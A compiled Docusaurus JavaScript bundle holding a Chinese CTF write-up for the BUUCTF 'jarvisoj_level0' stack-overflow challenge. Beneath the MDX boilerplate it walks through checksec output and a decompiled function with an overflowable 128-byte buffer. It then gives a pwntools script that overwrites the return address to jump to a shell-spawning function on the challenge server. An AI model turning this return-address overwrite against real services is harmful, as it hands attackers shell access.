(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[599],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return p},kt:function(){return d}});var r=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var c=r.createContext({}),u=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},p=function(e){var n=u(e.components);return r.createElement(c.Provider,{value:n},e.children)},s={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},f=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,c=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),f=u(t),d=o,m=f["".concat(c,".").concat(d)]||f[d]||s[d]||a;return t?r.createElement(m,i(i({ref:n},p),{},{components:t})):r.createElement(m,i({ref:n},p))}));function d(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,i=new Array(a);i[0]=f;var l={};for(var c in n)hasOwnProperty.call(n,c)&&(l[c]=n[c]);l.originalType=e,l.mdxType="string"==typeof e?e:o,i[1]=l;for(var u=2;u<a;u++)i[u]=t[u];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}f.displayName="MDXCreateElement"},6934:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return l},contentTitle:function(){return c},metadata:function(){return u},toc:function(){return p},default:function(){return f}});var r=t(2122),o=t(9756),a=(t(7294),t(3905)),i=["components"],l={title:"jarvisoj_level0",sidebar_position:5},c=void 0,u={unversionedId:"BUUCTF/\u6808\u6ea2\u51fa/jarvisoj_level0",id:"BUUCTF/\u6808\u6ea2\u51fa/jarvisoj_level0",isDocsHomePage:!1,title:"jarvisoj_level0",description:"\u77e5\u8bc6\u70b9",source:"@site/docs\\BUUCTF\\\u6808\u6ea2\u51fa\\jarvisoj_level0.md",sourceDirName:"BUUCTF/\u6808\u6ea2\u51fa",slug:"/BUUCTF/\u6808\u6ea2\u51fa/jarvisoj_level0",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/jarvisoj_level0",version:"current",sidebarPosition:5,frontMatter:{title:"jarvisoj_level0",sidebar_position:5},sidebar:"tutorialSidebar",previous:{title:"pwn1_sctf_2016",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/pwn1_sctf_2016"},next:{title:"ciscn_2019_c_1",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_c_1"}},p=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",children:[]},{value:"\u89e3\u9898\u5206\u6790",id:"\u89e3\u9898\u5206\u6790",children:[]}],s={toc:p};function f(e){var n=e.components,t=(0,o.Z)(e,i);return(0,a.kt)("wrapper",(0,r.Z)({},s,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"\u77e5\u8bc6\u70b9"},"\u77e5\u8bc6\u70b9"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"\u6808\u6ea2\u51fa\u8986\u76d6\u6808\u4e2d\u8fd4\u56de\u5730\u5740")),(0,a.kt)("h2",{id:"\u89e3\u9898\u5206\u6790"},"\u89e3\u9898\u5206\u6790"),(0,a.kt)("p",null,"checksec\u7ed3\u679c\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ checksec --file=level0                                                                                                                     4 \u2a2f\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nNo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69) Symbols       No    0               1               level0\n")),(0,a.kt)("p",null,"\u62d6\u5165ida64\u5206\u6790\uff0c\u7531\u4e8e",(0,a.kt)("inlineCode",{parentName:"p"},"main"),"\u51fd\u6570\u6ca1\u4ec0\u4e48\u4ef7\u503c\uff0c\u76f4\u63a5\u770b",(0,a.kt)("inlineCode",{parentName:"p"},"vulnerable_function"),"\u51fd\u6570"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-c"},"ssize_t vulnerable_function()\n{\n  char buf[128]; // [rsp+0h] [rbp-80h] BYREF\n\n  return read(0, buf, 0x200uLL);\n}\n")),(0,a.kt)("p",null,"\u5f88\u7b80\u5355\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u8bfb\u5165\u5b57\u7b26\uff0c\u4fdd\u5b58\u5230buf\u53d8\u91cf\u4e2d\u3002\u4f46\u662fread\u8bfb\u5165\u5b57\u7b26\u6570\u662f0x200\uff0cbuf\u5230\u6808\u5e95\u8ddd\u79bb\u662f0x80\uff0c\u5f88\u660e\u663e\u4f1a\u9020\u6210\u6ea2\u51fa\u3002\u641c\u7d22\u5b57\u7b26\u4e32\u627e\u5230",(0,a.kt)("inlineCode",{parentName:"p"},"callsystem"),"\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u6743\u9650\uff0c\u5730\u5740\u662f",(0,a.kt)("inlineCode",{parentName:"p"},"0x400596"),"\u3002"),(0,a.kt)("p",null,"\u811a\u672c\u5982\u4e0b\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nis_debug = 1\nelf = './level0'\nhost = 'node3.buuoj.cn'\nport = 25980\n\ndef main():\n    if is_debug:\n        sh = process(elf)\n    else:\n        sh = remote(host, port)\n    payload = b'a' * 0x88 + p64(0x400596)\n    sh.sendline(payload)\n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")))}f.isMDXComponent=!0}}]);